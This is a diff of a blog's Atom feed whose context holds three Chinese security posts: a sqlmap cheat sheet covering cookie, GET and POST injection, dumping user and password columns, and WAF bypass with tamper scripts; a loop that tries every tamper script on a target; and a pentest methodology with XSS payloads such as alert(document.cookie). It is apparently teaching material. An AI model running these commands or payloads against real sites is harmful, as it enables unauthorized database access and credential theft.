@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-30T10:24:42.367Z</updated>
+  <updated>2018-03-30T10:46:28.861Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://yoursite.com/2018/03/30/%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
     <id>http://yoursite.com/2018/03/30/常见SQLmap使用方法/</id>
     <published>2018-03-30T06:53:28.000Z</published>
-    <updated>2018-03-30T10:24:42.367Z</updated>
+    <updated>2018-03-30T10:46:28.861Z</updated>
     
     <content type="html"><![CDATA[<h3 id="ASP-COOKIE注入"><a href="#ASP-COOKIE注入" class="headerlink" title="ASP COOKIE注入"></a>ASP COOKIE注入</h3><p>我在注射点参数上加and 1=1后，<a href="http://url/shownews.asp?id=93" target="_blank" rel="noopener">http://url/shownews.asp?id=93</a> and 1=1出现如下图所示的情况。<br><a id="more"></a><br><img src="/images/5.1.png" alt=""><br><img src="/images/5.2.png" alt="" title="默认注入失败"><br>很明显，有防护呀.所以该读者默认参数注射是不能成功的。像这种情况，我们可以用SQLMAP的tamper参数来绕过试一下。不过在此之前，我们还是先试一下<a href="http://url/?id=1" target="_blank" rel="noopener">http://url/?id=1</a> 有没有COOKIE注射。因为很多老的软防护waf只会对GET、POST进行保护，却忽略了COOKIE。<br>默认情况下SQLMAP只支持GET/POST参数的注入测试.现在使用cookie注入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://url/shownews.asp&quot; --cookie &quot;id=93&quot; --level 2 --dbms &quot;Microsoft Access&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/5.3.png" alt="" title="cookie注入成功"></p><h3 id="PHP注入"><a href="#PHP注入" class="headerlink" title="PHP注入"></a>PHP注入</h3><p>(1)查找数据库</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> –dbs</p></blockquote><p>(2)通过第一步的数据库查找表(假如数据库名为dataname)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname –tables</p></blockquote><p>(3)通过2中的表得出列名(假如表为table_name)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name –columns</p></blockquote><p>(4)获取字段的值(假如扫描出id,user,password字段)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name -C “user,password” –dump</p></blockquote><h3 id="post登陆框注入"><a href="#post登陆框注入" class="headerlink" title="post登陆框注入"></a>post登陆框注入</h3><p>(1)其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件<br>我们在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>这里分享一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。</p><ol><li>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</li><li>配置burp代理(127.0.0.1:8080)以拦截请求</li><li>点击login表单的submit按钮</li><li>这时候Burp会拦截到了我们的登录POST请求</li><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</li></ol><p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a><br>几种注入方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r search-test.txt -p tfUPass</span><br></pre></td></tr></table></figure></p><p>(2)自动的搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure></p><p>(3)指定参数搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br></pre></td></tr></table></figure></p><h3 id="绕过WAF防火墙"><a href="#绕过WAF防火墙" class="headerlink" title="绕过WAF防火墙"></a>绕过WAF防火墙</h3><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</span><br></pre></td></tr></table></figure></p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py<br>都是编码方式<br>space2hash.py base64encode.py charencode.py</p><h3 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h3><p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br><em>相关连接地址:<a href="https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html" target="_blank" rel="noopener">https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html</a></em></p>]]></content>
     
@@ -31,6 +31,12 @@
     
     </summary>
     
+      <category term="sqlmap" scheme="http://yoursite.com/categories/sqlmap/"/>
+    
+    
+      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
+    
+      <category term="WAF" scheme="http://yoursite.com/tags/WAF/"/>
     
   </entry>
   
@@ -39,7 +45,7 @@
     <link href="http://yoursite.com/2018/03/21/%E7%94%A8sqlmap%E7%B2%97%E6%9A%B4%E5%9C%B0%E7%BB%95%E8%BF%87waf/"/>
     <id>http://yoursite.com/2018/03/21/用sqlmap粗暴地绕过waf/</id>
     <published>2018-03-21T03:18:38.000Z</published>
-    <updated>2018-03-30T10:19:03.335Z</updated>
+    <updated>2018-03-30T10:49:40.392Z</updated>
     
     <content type="html"><![CDATA[<p>许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。<a id="more"></a>tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……<br><img src="/images/4.1.jpg" alt="" title="linux下tamper脚本位置"><br><img src="/images/4.2.jpg" alt="" title="win下tamper脚本位置"><br>但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done;</span><br></pre></td></tr></table></figure></p><p><img src="/images/4.3.jpg" alt=""><br>说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。<br>如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmapamper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10</span><br></pre></td></tr></table></figure></p><p><img src="/images/4.4.jpg" alt=""><br>当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。<br>原文地址:<a href="https://www.toutiao.com/i6527560237581337091/" target="_blank" rel="noopener">https://www.toutiao.com/i6527560237581337091/</a></p>]]></content>
     
@@ -54,6 +60,8 @@
     
       <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
     
+      <category term="WAF" scheme="http://yoursite.com/tags/WAF/"/>
+    
   </entry>
   
   <entry>
@@ -61,7 +69,7 @@
     <link href="http://yoursite.com/2018/03/10/%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
     <id>http://yoursite.com/2018/03/10/网站的渗透测试思路/</id>
     <published>2018-03-10T05:15:05.000Z</published>
-    <updated>2018-03-10T07:36:26.883Z</updated>
+    <updated>2018-03-30T10:48:46.894Z</updated>
     
     <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>2、网站指纹识别（包括，cms，cdn，证书等），dns记录<br>3、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>4、子域名收集，旁站查询(有授权可渗透)，C段等<br><a id="more"></a><br>5、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>6、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>7、传输协议，通用漏洞，exp，github源码等</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>1、浏览网站，看看网站规模，功能，特点等<br>2、端口，弱口令，目录等扫描<br>3、XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p><h3 id="漏洞利用-权限提升"><a href="#漏洞利用-权限提升" class="headerlink" title="漏洞利用 | 权限提升"></a>漏洞利用 | 权限提升</h3><h4 id="SQL注入，XSS，CSRF等"><a href="#SQL注入，XSS，CSRF等" class="headerlink" title="SQL注入，XSS，CSRF等"></a>SQL注入，XSS，CSRF等</h4><p><strong>SQL注入原理</strong><br>1、SQL（结构化语句查询）<br>2、提交参数（调用数据库查询）的地方是用户可控的，并未做任何过滤处理<br>3、分 数字型，字符型，搜索型，POST注入，Cookie注入，延时注入，盲注等<br><strong>SQL注入，注入方法</strong><br>1、如果是get型号，直接，sqlmap-u “注入点URL”<br>2、如果是post型诸如点，可以sqlmap-u “注入点URL” –data=”post的参数”<br>3、如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用 * 号替换，放到文件里，然后sqlmap -r “文件地址”<br><strong>XSS原理</strong><br>网站未对用户输入的数据做过滤处理，构造特定的JS脚本插入到文本框可引发XSS，会被浏览器解析，执行<br><strong>XSS常见攻击语句</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">svg</span> /<span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">" "</span>=<span class="string">" "</span><span class="attr">onerror</span>=<span class="string">"alert('xss')"</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br></pre></td></tr></table></figure></p><h4 id="mysql提权，serv-u提权，linux内核版本提权等"><a href="#mysql提权，serv-u提权，linux内核版本提权等" class="headerlink" title="mysql提权，serv-u提权，linux内核版本提权等"></a>mysql提权，serv-u提权，linux内核版本提权等</h4><h3 id="清除测试数据-输出报告"><a href="#清除测试数据-输出报告" class="headerlink" title="清除测试数据 | 输出报告"></a>清除测试数据 | 输出报告</h3><p>1、日志、测试数据的清理<br>2、总结，输出渗透测试报告，附修复方案</p><h3 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h3><p>1、验证并发现是否有新漏洞，输出报告，归档</p><h3 id="网络安全事件应急响应"><a href="#网络安全事件应急响应" class="headerlink" title="网络安全事件应急响应"></a>网络安全事件应急响应</h3><p>1、取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；<br>2、处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）<br>3、溯源，查入侵IP，入侵手法（网路攻击事件）的确定等<br>4、记录，归档—-预防-事件检测-抑制-根除-恢复-跟踪-记录</p>]]></content>
     
@@ -71,6 +79,10 @@
     
     </summary>
     
+      <category term="Webshell" scheme="http://yoursite.com/categories/Webshell/"/>
+    
+    
+      <category term="Webshell" scheme="http://yoursite.com/tags/Webshell/"/>
     
   </entry>
   
